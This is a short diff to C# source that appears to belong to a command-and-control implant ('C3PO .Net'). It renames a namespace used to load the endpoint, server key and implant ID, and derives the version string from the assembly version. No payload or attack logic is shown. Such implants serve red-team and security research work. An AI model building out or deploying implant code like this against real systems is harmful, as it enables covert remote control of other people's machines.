@@ -4,6 +4,7 @@ using System.Diagnostics;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
+using System.Reflection;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
@@ -44,9 +45,9 @@ namespace EntryPoint
 
         public static async Task Start()
         {
-            string connUrl = Agentv2.Properties.Resources.EndPoint;
-            string serverKey = Agentv2.Properties.Resources.Key;
-            string implantId = Agentv2.Properties.Resources.Implant;
+            string connUrl = Agent.Properties.Resources.EndPoint;
+            string serverKey = Agent.Properties.Resources.Key;
+            string implantId = Agent.Properties.Resources.Implant;
 #if DEBUG
             Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));
 
@@ -175,7 +176,7 @@ namespace EntryPoint
                 Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Integrity = integrity,
                 EndPoint = endpoint,
-                Version = "C3PO .Net 2.0",
+                Version = "C3PO .Net" + Assembly.GetExecutingAssembly().GetName().Version.ToString(),
                 SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
                 SleepJitter = 0
             };
